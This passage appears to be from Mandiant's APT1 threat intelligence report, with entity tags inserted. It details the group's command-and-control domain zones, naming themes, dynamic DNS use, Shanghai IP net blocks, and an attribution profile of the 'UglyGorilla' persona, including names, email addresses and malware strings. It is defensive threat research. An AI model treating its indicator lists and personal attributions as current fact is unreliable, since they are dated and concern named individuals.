<THREAT_ACTOR>APT1</THREAT_ACTOR>’s infrastructure includes FQDNs in addition 
to the IP addresses discussed above. The FQDNs 
play an important role in their intrusion campaigns 
because <THREAT_ACTOR>APT1</THREAT_ACTOR> embeds FQDNs as C2 addresses 
within their backdoors. In the last several years 
we have confirmed 2,551 FQDNs attributed to 
<THREAT_ACTOR>APT1</THREAT_ACTOR>. Of these, we have redacted FQDNs that 
implicated victims by name and provided 2,046 in 
Appendix D. By using FQDNs rather than hard-
coded IP addresses as C2 addresses, attackers 
may dynamically decide where to direct C2 
connections from a given backdoor. That is, if they 
lose control of a specific hop point (IP address) 
they can “point” the C2 FQDN address to a 
different IP address and resume their control over 
victim backdoors. This flexibility allows the attacker 
to direct victim systems to myriad C2 servers and 
avoid being blocked.

<THREAT_ACTOR>APT1</THREAT_ACTOR> FQDNs can be grouped into three categories: 
(1) registered zones, (2) third-party zones, and (3) 
hijacked domains. 

REGISTERED ZONES

A DNS zone represents a collection of FQDNs that 
end with the same name, and which are usually 
registered through a domain registration company 
and controlled by a single owner. For example, 
“<IOC>hugesoft.org</IOC>” is an FQDN but also represents 
a zone. The FQDNs “<IOC>ug-co.hugesoft.org</IOC>” and 
“<IOC>7cback.hugesoft.org</IOC>” are part of the “<IOC>hugesoft.org</IOC>” zone and are called “subdomains” of the zone. 
The person who registered “<IOC>hugesoft.org</IOC>” may add 
as many subdomains as they wish and controls the 
IP resolutions of these FQDNs. <THREAT_ACTOR>APT1</THREAT_ACTOR> has registered 
at least 107 zones <TIMESTAMP>since 2004</TIMESTAMP>. Within these zones, 
we know of thousands of FQDNs that have resolved 
to hundreds of IP addresses (which we suspect are 
hops) and in some instances to <THREAT_ACTOR>APT1</THREAT_ACTOR>’s source IP 
addresses in <CITY>Shanghai</CITY>.

The first zone we became aware of was “<IOC>hugesoft.org</IOC>”, which was registered through <ORG>eNom, Inc.</ORG> in <TIMESTAMP>October 2004</TIMESTAMP>. The registrant supplied 
“<IDENTITY>uglygorilla@163.com</IDENTITY>” as an email address. The 
supplied registration information, which is still 
visible in public “whois” data as of <TIMESTAMP>February 3, 2013</TIMESTAMP>, includes the following:

<THREAT_ACTOR>APT1</THREAT_ACTOR> Zone Registrations

<IOC>hugesoft.org</IOC>
<IOC>ustvb.com</IOC>
<IOC>uszzcs.com</IOC>
<IOC>hvmetal.com</IOC>
<IOC>hkcastte.com</IOC>
<IOC>attnpower.com</IOC>
<IOC>ifexcel.com</IOC>
<IOC>bpyoyo.com</IOC>
<IOC>skyswim.net</IOC>
<IOC>cslisten.com</IOC>
<IOC>bigish.net</IOC>
<IOC>chileexe77.com</IOC>
<IOC>issnbgkit.net</IOC>
<IOC>progammerli.com</IOC>
<IOC>idirectech.com</IOC>
<IOC>livemymsn.com</IOC>
<IOC>webservicesupdate.com</IOC>
<IOC>giftnews.org</IOC>
<IOC>onefastgame.net</IOC>
<IOC>conferencesinfo.com</IOC>

5 zones created

<IOC>cometoway.org</IOC>

6 zones created

6 zones created

<IOC>usnftc.org</IOC>

<IOC>phoenixtvus.com</IOC>

<IOC>ushongkong.org</IOC>
<IOC>newsesport.com</IOC>
<IOC>youipcam.com</IOC>
<IOC>olmusic100.com</IOC>
<IOC>todayusa.org</IOC>
<IOC>bluecoate.com</IOC>

4 zones created

<IOC>bigdepression.net</IOC>

<IOC>arrowservice.net</IOC>
<IOC>blackcake.net</IOC>
<IOC>businessconsults.net</IOC>
<IOC>infosupports.com</IOC>
<IOC>newsonet.net</IOC>
<IOC>purpledaily.com</IOC>

<IOC>avvmail.com</IOC>
<IOC>shepmas.com</IOC>

<IOC>syscation.com</IOC>
<IOC>tibethome.org</IOC>
<IOC>microsoft-update-info.com</IOC>

<IOC>busketball.com</IOC>
<IOC>comrepair.net</IOC>
<IOC>gmailboxes.com</IOC>
<IOC>oplaymagzine.com</IOC>

<IOC>maltempata.com</IOC>
<IOC>nirvanaol.com</IOC>

7 zones created

<IOC>cnndaily.com</IOC>
<IOC>myyahoonews.com</IOC>
<IOC>satellitebbs.com</IOC>

<IOC>msnhome.org</IOC>
<IOC>usabbs.org</IOC>

<IOC>ns06.net</IOC>

6 zones created

<IOC>copporationnews.com</IOC>

7 zones created
<IOC>nytimesnews.net</IOC>
<IOC>cnnnewsdaily.com</IOC>
<IOC>applesoftupdate.com</IOC>

4 zones created

<IOC>micyuisyahooapis.com</IOC>
<IOC>infobusinessus.org</IOC>

<TIMESTAMP>2004</TIMESTAMP>

<TIMESTAMP>2005</TIMESTAMP>

<TIMESTAMP>2006</TIMESTAMP>

<TIMESTAMP>2007</TIMESTAMP>

<TIMESTAMP>2008</TIMESTAMP>

<TIMESTAMP>2009</TIMESTAMP>

<TIMESTAMP>2010</TIMESTAMP>

<TIMESTAMP>2011</TIMESTAMP>

<TIMESTAMP>2012</TIMESTAMP>



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 46 www.mandiant.com

Domain Name:<IOC>HUGESOFT.ORG</IOC>
Created On:<TIMESTAMP>25-Oct-2004 09:46:18 UTC</TIMESTAMP> 
Registrant Name:<IDENTITY>huge soft</IDENTITY>
Registrant Organization:<IDENTITY>hugesoft</IDENTITY>
Registrant Street1:<CITY>Shanghai</CITY>
Registrant City:<CITY>Shanghai</CITY>
Registrant State/Province:S
Registrant Postal Code:200001
Registrant Country:<COUNTRY>CN</COUNTRY>
Registrant Phone:+86.21000021
Registrant Email:<IDENTITY>uglygorilla@163.com</IDENTITY>

The supplied registrant information does not need to be accurate for the zone to be registered successfully. For 
example, “<CITY>Shanghai</CITY>” is not a street name. Nevertheless, it is noteworthy that <CITY>Shanghai</CITY> appeared in the first known 
<THREAT_ACTOR>APT1</THREAT_ACTOR> domain registration, along with a phone number that begins with <COUNTRY>China</COUNTRY>’s “+86” international code. In fact, 
<CITY>Shanghai</CITY> was listed as the registrant’s city in at least 24 of the 107 (22%) registrations. Compare this to the frequency 
with which other cities appeared in <THREAT_ACTOR>APT1</THREAT_ACTOR> zone registration information:

taBLe 10: Locations supplied in registration data other than <CITY>Shanghai</CITY>, <COUNTRY>China</COUNTRY>

number City state Country
7 <CITY>Beijing</CITY> - <COUNTRY>China</COUNTRY>
5 <CITY>Calgary</CITY> <COUNTRY>Canada</COUNTRY> 
4 <CITY>Guizhou</CITY> - <COUNTRY>China</COUNTRY>
4 <CITY>Pasadena</CITY> CA <COUNTRY>US</COUNTRY>
4 <CITY>Houston</CITY> TX <COUNTRY>US</COUNTRY>
3 <CITY>Sydney</CITY> <COUNTRY>Australia</COUNTRY>
3 <CITY>Salt Lake</CITY> UT <COUNTRY>US</COUNTRY>
3 <CITY>Washington</CITY>, DC <COUNTRY>US</COUNTRY>
2 <CITY>Homewood</CITY> AL <COUNTRY>US</COUNTRY>
2 <CITY>Kalkaska</CITY> MI <COUNTRY>US</COUNTRY>
2 <CITY>Shallotte</CITY> NC <COUNTRY>US</COUNTRY>
2 <CITY>Yellow Spring</CITY> OH <COUNTRY>US</COUNTRY>
2 <CITY>New York</CITY> NY <COUNTRY>US</COUNTRY>
2 <CITY>Provo</CITY> UT <COUNTRY>US</COUNTRY>
2 <CITY>Shenzhen</CITY> - <COUNTRY>China</COUNTRY>
1 <CITY>Birmingham</CITY> AL <COUNTRY>US</COUNTRY>
1 <CITY>Scottsdale</CITY> AZ <COUNTRY>US</COUNTRY>
1 <CITY>Sunnyvale</CITY> CA <COUNTRY>US</COUNTRY>
1 <CITY>Albany</CITY> NY <COUNTRY>US</COUNTRY>
1 <CITY>Pearl River</CITY> NY <COUNTRY>US</COUNTRY>
1 <CITY>Chicago</CITY> - <COUNTRY>US</COUNTRY>
1 <CITY>Moscow</CITY> - <COUNTRY>Guatemala</COUNTRY>
1 <CITY>Nanning</CITY> - <COUNTRY>China</COUNTRY>
1 <CITY>Wuhua</CITY> - <COUNTRY>China</COUNTRY>
27 Registration information blocked or not available 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 47 www.mandiant.com

Some of the supplied registration information is obviously false. For example, consider the registration information 
supplied for the zone “<IOC>uszzcs.com</IOC>” in <TIMESTAMP>2005</TIMESTAMP>:

  <IDENTITY>Victor</IDENTITY> <IOC>etejedaa@yahoo.com</IOC> +86.8005439436
  <IDENTITY>Michael Murphy</IDENTITY>
  795 Livermore St.
  Yellow Spring,Ohio,<COUNTRY>United States</COUNTRY> 45387

Here, a phone number with a Chinese prefix (“+86”) accompanied an address in the <COUNTRY>United States</COUNTRY>. Since the <COUNTRY>United States</COUNTRY> uses the prefix “+1”, it is highly unlikely that a person living in Ohio would provide a phone number beginning 
with “+86”. Additionally, the city name is spelled incorrectly, as it should be “<CITY>Yellow Springs</CITY>” instead of “Yellow 
Spring”. This could have been attributed to a one-time spelling mistake, except the registrant spelled the city name 
incorrectly multiple times, both for the zones “<IOC>uszzcs.com</IOC>” and “<IOC>attnpower.com</IOC>”. This suggests that the registrant 
really thought “Yellow Spring” was the correct spelling and that he or she did not, in fact, live or work in <CITY>Yellow Springs</CITY>, 
Ohio. 

Overall, the combination of a relatively high number of “<CITY>Shanghai</CITY>” registrations with obviously false registration 
examples in other registrations suggests a partially uncoordinated domain registration campaign <TIMESTAMP>from 2004 until present</TIMESTAMP>, in which some registrants tried to fabricate non-<CITY>Shanghai</CITY> locations but others did not. This is supported by 
contextual information on the Internet for the email address “<IOC>lfengg@163.com</IOC>,” which was supplied in the registration 
information for seven of the 107 zones. On the site “www.<COUNTRY>China</COUNTRY>-one.org,” the email address “<IOC>lfengg@163.com</IOC>” 
appears as the contact for the <CITY>Shanghai</CITY> <ORG>Kai Optical Information Technology Co., Ltd.</ORG>, a website production company 
located in a part of <CITY>Shanghai</CITY> that is across the river from <THREAT_ACTOR>PLA Unit 61398</THREAT_ACTOR>. 

FIGure 25: an email address used to register <THREAT_ACTOR>APT1</THREAT_ACTOR> zones is also a contact for a <CITY>Shanghai</CITY> company



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 48 www.mandiant.com

naming themes
About half of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s known zones were named according to three themes: news, technology and business. These 
themes cause <THREAT_ACTOR>APT1</THREAT_ACTOR> command and control addresses to appear benign at first glance. However, we believe that the 
hundreds of FQDNs within these zones were created for the purpose of <THREAT_ACTOR>APT1</THREAT_ACTOR> intrusions. (Note: these themes are not 
unique to <THREAT_ACTOR>APT1</THREAT_ACTOR> or even <THREAT_ACTOR>APT</THREAT_ACTOR> in general.) 

The news-themed zones include the names of well-known news media outlets such as <ORG>CNN</ORG>, <ORG>Yahoo</ORG> and <ORG>Reuters</ORG>. 
However, they also include names referencing English-speaking countries, such as “<IOC>aunewsonline.com</IOC>” (<COUNTRY>Australia</COUNTRY>), 
“<IOC>Canadatvsite.com</IOC>” (<COUNTRY>Canada</COUNTRY>), and “<IOC>todayusa.org</IOC>” (<COUNTRY>U.S.</COUNTRY>). Below is a list of zones registered by <THREAT_ACTOR>APT1</THREAT_ACTOR> that are news-
themed:

<IOC>aoldaily.com</IOC>
<IOC>aunewsonline.com</IOC>
<IOC>Canadatvsite.com</IOC>
<IOC>canoedaily.com</IOC>
<IOC>cnndaily.com</IOC>
<IOC>cnndaily.net</IOC>
<IOC>cnnnewsdaily.com</IOC>
<IOC>defenceonline.net</IOC>
<IOC>freshreaders.net</IOC>
<IOC>giftnews.org</IOC>

<IOC>issnbgkit.net</IOC>
<IOC>mediaxsds.net</IOC>
<IOC>myyahoonews.com</IOC>
<IOC>newsesport.com</IOC>
<IOC>newsonet.net</IOC>
<IOC>newsonlinesite.com</IOC>
<IOC>newspappers.org</IOC>
<IOC>nytimesnews.net</IOC>
<IOC>oplaymagzine.com</IOC>
<IOC>phoenixtvus.com</IOC>

<IOC>purpledaily.com</IOC>
<IOC>reutersnewsonline.com</IOC>
<IOC>rssadvanced.org</IOC>
<IOC>saltlakenews.org</IOC>
<IOC>sportreadok.net</IOC>
<IOC>todayusa.org</IOC>
<IOC>usapappers.com</IOC>
<IOC>usnewssite.com</IOC>
<IOC>yahoodaily.com</IOC>

The technology-themed zones reference well-known technology companies (<ORG>AOL</ORG>, <ORG>Apple</ORG>, <ORG>Google</ORG>, <ORG>Microsoft</ORG>), antivirus 
vendors (<ORG>McAfee</ORG>, <ORG>Symantec</ORG>), and products (<ORG>Blackberry</ORG>, <ORG>Bluecoat</ORG>). <THREAT_ACTOR>APT1</THREAT_ACTOR> also used more generic names referencing 
topics like software:

<IOC>aolon1ine.com</IOC>
<IOC>applesoftupdate.com</IOC>
<IOC>blackberrycluter.com</IOC>
<IOC>bluecoate.com</IOC>
<IOC>comrepair.net</IOC>
<IOC>dnsweb.org</IOC>
<IOC>downloadsite.me</IOC>
<IOC>firefoxupdata.com</IOC>

<IOC>globalowa.com</IOC>
<IOC>gmailboxes.com</IOC>
<IOC>hugesoft.org</IOC>
<IOC>idirectech.com</IOC>
<IOC>ifexcel.com</IOC>
<IOC>infosupports.com</IOC>
<IOC>livemymsn.com</IOC>
<IOC>mcafeepaying.com</IOC>

<IOC>microsoft-update-info.com</IOC>
<IOC>micyuisyahooapis.com</IOC>
<IOC>msnhome.org</IOC>
<IOC>pcclubddk.net</IOC>
<IOC>progammerli.com</IOC>
<IOC>softsolutionbox.net</IOC>
<IOC>symanteconline.net</IOC>
<IOC>webservicesupdate.com</IOC>

Finally, some zones used by <THREAT_ACTOR>APT1</THREAT_ACTOR> reflect a business theme. The names suggest websites that professionals might visit:

<IOC>advanbusiness.com</IOC>
<IOC>businessconsults.net</IOC>
<IOC>businessformars.com</IOC>

<IOC>companyinfosite.com</IOC>
<IOC>conferencesinfo.com</IOC>
<IOC>copporationnews.com</IOC>

<IOC>infobusinessus.org</IOC>
<IOC>jobsadvanced.com</IOC>

Not every zone stays within <THREAT_ACTOR>APT1</THREAT_ACTOR>’s control forever. Over a campaign lasting for so many years, <THREAT_ACTOR>APT1</THREAT_ACTOR> has not always 
renewed every zone in their attack infrastructure. Additionally, while some have simply been allowed to expire, 
others have been transferred to the organizations that the domain names attempted to imitate. For example, <TIMESTAMP>in September 2011</TIMESTAMP>, Yahoo filed a complaint against “<IDENTITY>zheng youjun</IDENTITY>” of “Arizona, <COUNTRY>USA</COUNTRY>”, who registered the <THREAT_ACTOR>APT1</THREAT_ACTOR> 
zone “<IOC>myyahoonews.com</IOC>”.37 <ORG>Yahoo</ORG> alleged the “< <IOC>myyahoonews.com</IOC> > domain name was confusingly similar to 
Complainant’s <ORG>YAHOO!</ORG> mark” and that “[<IDENTITY>zheng youjun</IDENTITY>] registered and used the < <IOC>myyahoonews.com</IOC> > domain name 
in bad faith.” In response, the National Arbitration Forum found that the site “<IOC>myyahoonews.com</IOC>” at the time resolved 

37  <ORG>Yahoo! Inc.</ORG> v. Zheng National Arbitration Forum Claim Number: FA1109001409001, (<TIMESTAMP>October 31, 2011</TIMESTAMP>) (T<IDENTITY>yrus R. Atkinson, Jr.</IDENTITY>, panelist), http://
domains.adrforum.com/domains/decisions/1409001.htm, accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 49 www.mandiant.com

to “a phishing web page, substantially similar to the actual WorldSID website...in an effort to collect login credentials 
under false pretenses.” Not surprisingly, “<IDENTITY>zheng youjun</IDENTITY>” did not respond. Subsequently, control of “<IOC>myyahoonews.com</IOC>” was transferred from <THREAT_ACTOR>APT1</THREAT_ACTOR> to <ORG>Yahoo</ORG>.

third-Party services
The third-party service that <THREAT_ACTOR>APT1</THREAT_ACTOR> has used the most is known as “dynamic DNS.” This is a service that allows people 
to register subdomains under zones that other people have registered and provided to the service. Over the years, 
<THREAT_ACTOR>APT1</THREAT_ACTOR> has registered hundreds of FQDNs in this manner. When they need to change the IP resolution of an FQDN, they 
simply log in to these services and update the IP resolution of their FQDN via a web-based interface.

In addition to dynamic DNS, recently we have observed that <THREAT_ACTOR>APT1</THREAT_ACTOR> has been creating FQDNs that end with  
“<IOC>appspot.com</IOC>”, suggesting that they are using <SOFTWARE>Google’s App Engine</SOFTWARE> service.

hijacked FQDns
<THREAT_ACTOR>APT1</THREAT_ACTOR> intruders often use the FQDNs that are associated with legitimate websites hosted by their hop points. We 
consider these domains to be “hijacked” because they were registered by someone for a legitimate reason, but have 
been leveraged by <THREAT_ACTOR>APT1</THREAT_ACTOR> for malicious purposes. <THREAT_ACTOR>APT1</THREAT_ACTOR> uses hijacked FQDNs for two main purposes. First, they 
place malware (usually in ZIP files) on the legitimate websites hosted on the hop point and then send spear phishing 
emails with a link that includes the legitimate FQDN. Second, they embed hijacked FQDNs as C2 addresses in their 
backdoors. 

EVIDENCE OF A VAST INFRASTRUCTURE

As noted above, we have confirmed the existence of 937 servers (listening applications) hosted on 849 distinct IP 
addresses, with the majority of IP addresses registered to organizations in <COUNTRY>China</COUNTRY> (709), followed by the <COUNTRY>U.S.</COUNTRY> (109). 
In the last three years we have observed <THREAT_ACTOR>APT1</THREAT_ACTOR> FQDNs resolving to 988 unique IP addresses that we believe are not 
“sinkhole”38 or “domain parking”39 IP addresses:

»» <COUNTRY>United States</COUNTRY>: 559

»» <COUNTRY>China</COUNTRY>: 263

»» <COUNTRY>Taiwan</COUNTRY>: 25

»» <COUNTRY>Korea</COUNTRY>: 22

»» <COUNTRY>United Kingdom</COUNTRY>: 14

»» <COUNTRY>Canada</COUNTRY>: 12

»» Other: 83

38  A sinkhole is a server that accepts redirected connections for known malicious domains. Attempted connections to C2 FQDNs are redirected to 
sinkholes once malicious zones are re-registered by research organizations or security companies in coordination with registration companies.
39  Some IP addresses are used for “domain parking” once the original registrant loses control of a zone or otherwise-registered FQDN, e.g., when 
the zone expires. These IP addresses usually host advertisements.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 50 www.mandiant.com

The vast majority of the Chinese IP addresses again belong to <THREAT_ACTOR>APT1</THREAT_ACTOR>’s home networks, meaning that in some instances 
<THREAT_ACTOR>APT1</THREAT_ACTOR> intruders probably communicated directly to victim systems from their <CITY>Shanghai</CITY> systems, bypassing their hop 
infrastructure:

taBLe 11: <THREAT_ACTOR>APT1</THREAT_ACTOR> FQDns have resolved to IP addresses within these Chinese net blocks 

number net block registered owner

150 <IOC>223.166.0.0 - 223.167.255.255</IOC> <ORG>China Unicom</ORG> <CITY>Shanghai</CITY> Network 

68 <IOC>58.246.0.0 - 58.247.255.255</IOC> <ORG>China Unicom</ORG> <CITY>Shanghai</CITY> Network 

10 <IOC>112.64.0.0 - 112.65.255.255</IOC> <ORG>China Unicom</ORG> <CITY>Shanghai</CITY> Network 

7 <IOC>114.80.0.0 - 114.95.255.255</IOC> <ORG>China Telecom</ORG> <CITY>Shanghai</CITY> Network

5 <IOC>139.226.0.0 - 139.227.255.255</IOC> <ORG>China Unicom</ORG> <CITY>Shanghai</CITY> Network 

4 <IOC>222.64.0.0 - 222.73.255.25</IOC> <ORG>China Telecom</ORG> <CITY>Shanghai</CITY> Network

3 <IOC>116.224.0.0 – 116.239.255.255</IOC> <ORG>China Telecom</ORG> <CITY>Shanghai</CITY> Network

16 Other (Non-<CITY>Shanghai</CITY>)

These statistics indicate that there are over 400 IP addresses in the <COUNTRY>U.S.</COUNTRY> alone that may have active <THREAT_ACTOR>APT1</THREAT_ACTOR> servers, 
which are as-yet unconfirmed by <ORG>Mandiant</ORG>. Additionally, although we know of over 2,500 <THREAT_ACTOR>APT1</THREAT_ACTOR> FQDNs, there are 
many <THREAT_ACTOR>APT1</THREAT_ACTOR> FQDNs that we have not attributed to <THREAT_ACTOR>APT1</THREAT_ACTOR>, which have resolved to even more IP addresses. We estimate 
(conservatively) that <THREAT_ACTOR>APT1</THREAT_ACTOR>’s current hop infrastructure includes over 1,000 servers. 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 51 www.mandiant.com

<THREAT_ACTOR>APT1</THREAT_ACTOR>: IDentItIes

<THREAT_ACTOR>APT1</THREAT_ACTOR> is not a ghost in a digital machine. In our effort to underscore that there are actual individuals tasked by the 
<ORG>PLA</ORG> behind <THREAT_ACTOR>APT1</THREAT_ACTOR>’s keyboards, we have decided to expose the identities of a select number of <THREAT_ACTOR>APT1</THREAT_ACTOR> personas. These 
actors have made poor operational security choices, facilitating our research and allowing us to track their activities. 
They are some of the authors of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s digital weapons and the registrants of <THREAT_ACTOR>APT1</THREAT_ACTOR> FQDNs and email accounts. These 
actors have expressed interest in <COUNTRY>China</COUNTRY>’s cyber warfare efforts, disclosed their locations to be the Pudong New Area 
of <CITY>Shanghai</CITY>, and have even used a <CITY>Shanghai</CITY> mobile phone number to register email accounts used in spear phishing 
campaigns.

Methods for attributing <THREAT_ACTOR>APT</THREAT_ACTOR> personnel often involve the synthesis of many small pieces of information into a singular 
comprehensive picture. Often this unified viewpoint reveals not only the group attribution, but coherent pockets 
of behavior within the group which we perceive to be either small teams or individual actors. We refer to these as 
“personas.” As <THREAT_ACTOR>APT1</THREAT_ACTOR> personas manage technical resources such as hops and Fully Qualified Domain Names (FQDNs), 
they have been observed to de-conflict their actions amongst themselves by coordinating the use of specific hops, 
FQDNs, <ORG>CNO</ORG> tools (e.g., malware) and ports.

One additional element working in our favor as threat trackers is the Great Firewall of <COUNTRY>China</COUNTRY> (GFWoC). Like many 
Chinese hackers, <THREAT_ACTOR>APT1</THREAT_ACTOR> attackers do not like to be constrained by the strict rules put in place by <ORG>the Communist Party</ORG> 
of <COUNTRY>China</COUNTRY> (<ORG>CPC</ORG>), which deployed the GFWoC as a censorship measure to restrict access to web sites such as google.
com, facebook.com, and twitter.com. Additionally, the nature of the hackers’ work requires them to have control of 
network infrastructure outside the GFWoC. This creates a situation where the easiest way for them to log into <ORG>Facebook</ORG> 
and <ORG>Twitter</ORG></ORG> is directly from their attack infrastructure. Once noticed, this is an effective way to discover their real 
identities.

what is the Great Firewall of <COUNTRY>China</COUNTRY>?
The “Great Firewall” is a term used to describe the various technical methods used by the 
<ORG>Chinese government</ORG> to censor and block or restrict access to Internet services and content 
that the government considers sensitive or inappropriate. “Inappropriate” content ranges 
from pornography to political dissent, and from social media to news sites that may portray 

<COUNTRY>China</COUNTRY> or Chinese officials in a negative light. The “Great Firewall” uses methods such as blocking particular 
IP addresses; blocking or redirecting specific domain names; filtering or blocking any URL containing target 
keywords; and rate-limiting or resetting TCP connections. Chinese censors also routinely monitor Chinese 
websites, blogs, and social media for “inappropriate” content, removing it when found. As a result, Chinese 
citizens who wish to access censored content must resort to workarounds such as the use of encryption. 
<COUNTRY>China</COUNTRY> continues to improve and further restrict Internet access, most recently (in <TIMESTAMP>December 2012</TIMESTAMP>) by blocking 
additional services and limiting or blocking the use of encryption technologies such as Virtual Private Networks. 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 52 www.mandiant.com

<THREAT_ACTOR>APT1</THREAT_ACTOR> Hacker Profile: <IDENTITY>Ugly Gorilla</IDENTITY> (<IDENTITY>Wang Dong</IDENTITY>/汪东)

The story of “<IDENTITY>Ugly Gorilla</IDENTITY>” (<IDENTITY>UG</IDENTITY>) dates <TIMESTAMP>back to 2004</TIMESTAMP>. 
A then-professor named <IDENTITY>Zhang Zhaozhong</IDENTITY> (张召
忠), now a retired rear ad<SOFTWARE>MIR</SOFTWARE>al, was in the process 
of helping to shape the future of <COUNTRY>China</COUNTRY>’s information 
warfare strategy.40 Professor <IDENTITY>Zhang</IDENTITY> was already a 
strong advocate for the “informationization” of military 
units, and had published several works on military 
strategy including “Network Warfare” (网络战争) and 
“Winning the Information War” (打赢信息化战争). As 
Director of the “Military Technology and Equipment” 
(军事科技与装备) department at <COUNTRY>China</COUNTRY>’s National 
Defense University (国防大学), professor <IDENTITY>Zhang</IDENTITY> was 
invited to take part in an event titled “Outlook 2004: 
The International Strategic Situation” in <TIMESTAMP>January 2004</TIMESTAMP>.

During the online question and answer session 
hosted by the <ORG>PLA</ORG> Daily’s (解放军报) <COUNTRY>China</COUNTRY> Military 
Online (中国军网), one young man with the nickname 
“<IDENTITY>Greenfield</IDENTITY>” (绿野) posed a particularly prescient 
question.

“Professor <IDENTITY>Zhang</IDENTITY>, I read your book ’network warfare‘ and was deeply impressed 
by the views and arguments in the book. It is said that the <COUNTRY>U.S.</COUNTRY> military has set up 
a dedicated network force referred to as a ‘cyber army.’ Does <COUNTRY>China</COUNTRY> have a similar 
force? Does <COUNTRY>China</COUNTRY> have cyber troops?” 

— <IDENTITY>UglyGorilla</IDENTITY> <TIMESTAMP>16 Jan 2004</TIMESTAMP>

Like all users of the <COUNTRY>China</COUNTRY> Military Online (<COUNTRY>China</COUNTRY>mil) forums, “<IDENTITY>Greenfield</IDENTITY>” was required to sign up with an email 
address and specify a small bit of information about himself. Thankfully, the Internet’s tendency to immortalize data 
preserved the profile details for us.

40 http://www.<COUNTRY>China</COUNTRY>mil.com.cn/site1/gflt/2004-09/30/content_705216.htm

FIGure 26: Professor <IDENTITY>Zhang</IDENTITY> (张召忠) <TIMESTAMP>16 Jan 2004</TIMESTAMP>, 
source http://www.<COUNTRY>China</COUNTRY>mil.com.cn/site1/gflt/2004-09/30/
content_705216.htm



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 53 www.mandiant.com

FIGure 27: <IDENTITY>uglyGorilla</IDENTITY> Chinamil profile, source: http://bbs.<COUNTRY>China</COUNTRY>mil.com.cn/forum/bbsui.jsp?id=(o)5681



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 54 www.mandiant.com

FIGure 28: <IDENTITY>UglyGorilla</IDENTITY> <COUNTRY>China</COUNTRY>mil profile translated by translate.google.com/

Thus, the persona we call “<IDENTITY>UglyGorilla</IDENTITY>” (<IDENTITY>UG</IDENTITY>) was first documented. In addition to his email address, <IDENTITY>UG</IDENTITY> listed his “real 
name” as “<IDENTITY>JackWang</IDENTITY>”. 

Within the year, we saw the first evidence of <IDENTITY>UG</IDENTITY> honing the tools of his trade. On <TIMESTAMP>October 25, 2004</TIMESTAMP>, <IDENTITY>UG</IDENTITY> registered the 
now infamous “<IOC>hugesoft.org</IOC>” zone. The “<IOC>hugesoft>.org</IOC>” zone and its many <THREAT_ACTOR>APT1</THREAT_ACTOR>-attributed hostnames have remained 
active and under the continuous ownership of <IDENTITY>UG</IDENTITY>, and are still active as of the time of this report. Registration 
information was most recently updated on <TIMESTAMP>September 10, 2012</TIMESTAMP>, extending the registration period for the zone well into 
<TIMESTAMP>2013</TIMESTAMP>. We may see <IDENTITY>UG</IDENTITY> relinquish this and other attributed zones as a result of this reporting, in an effort to deter further 
tracking and attribution.

In <TIMESTAMP>2007</TIMESTAMP>, <IDENTITY>UG</IDENTITY> authored the 
first known sample of the 
<MALWARE>MANITSME</MALWARE> family of malware 
and, like a good artist, left his 
clearly identifiable signature in 
the code: “v1.0 No Doubt to 
Hack You, Writed by <IDENTITY>UglyGorilla</IDENTITY>, 
<TIMESTAMP>06/29/2007</TIMESTAMP>”[sic]. <IDENTITY>UG</IDENTITY>’s 
tendency to sign his work is 
present in the strings he chooses 
for hostnames and even within 
the communications protocols 
his backdoors use. For example, 

what is a meat chicken?!? 
Chinese Hacker Slang: “rouji” ( 肉鸡 ) — Meat Chicken 
n. — An infected computer

Example strings from <MALWARE>MANITSME</MALWARE> samples: 
“<IOC>d:\My Documents\Visual Studio Projects\rouji\SvcMain.pdb</IOC>”

Examples from other malware… 
 “connecting to rouji” 
 “welcome to ***(rouji)”



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 55 www.Mandiant.com

hostnames within other <THREAT_ACTOR>APT1</THREAT_ACTOR>-attributed FQDNs such as “<IOC>arrowservice.net</IOC>” and even the newer “<IOC>msnhome.org</IOC>” 
continue to leave <IDENTITY>UG</IDENTITY>’s imprint (note the “<IDENTITY>ug</IDENTITY>” in the domains):
»» <IOC>ug-opm.hugesoft.org</IOC>
»» <IOC>ug-rj.arrowservice.net</IOC>
»» <IOC>ug-hst.msnhome.org</IOC>

Though these kinds of obvious attribution links tapered off as <IDENTITY>UG</IDENTITY> became more experienced, the protocol signatures of 
his tools such as <MALWARE>MANITSME</MALWARE> and <MALWARE>WEBC2-UGX</MALWARE> continue to be used by <THREAT_ACTOR>APT1</THREAT_ACTOR> attackers based out of <CITY>Shanghai</CITY>.

<IDENTITY>UG</IDENTITY>’s consistent use of the username “<IDENTITY>UglyGorilla</IDENTITY>” across various Web accounts has left a thin but strong thread of 
attribution through many online communities. In most instances, content such as hacking tools, information security 
topics, and association with the <CITY>Shanghai</CITY> locality are reasonable ways to eliminate false positives. For example, <TIMESTAMP>in February of 2011</TIMESTAMP>, the disclosure of all registered “rootkit.com” accounts published by Anonymous included the user 
“<IDENTITY>UglyGorilla</IDENTITY>” with the registered email address <IDENTITY>uglygorilla@163.com</IDENTITY>. This is the same email used to register for the 
<TIMESTAMP>2004</TIMESTAMP> <ORG>PLA</ORG> forum and the zone <IOC>hugesoft.org</IOC>. Included in the rootkit.com leaked account information was the IP address 
<IOC>58.246.255.28</IOC>, which was used to register <IDENTITY>UG</IDENTITY>’s account directly from the previously discussed <THREAT_ACTOR>APT1</THREAT_ACTOR> home range: 
<IOC>58.246.0.0/15</IOC>.

In a few of these accounts, <IDENTITY>UG</IDENTITY> has listed something other than “<IDENTITY>JackWang</IDENTITY>” as his real name. On <TIMESTAMP>February 2, 2006</TIMESTAMP>, a 
user named “<IDENTITY>UglyGorilla</IDENTITY>” uploaded a file named “<IOC>mailbomb_1.08.zip</IOC>” (a bulk email tool) to the Chinese developer site 
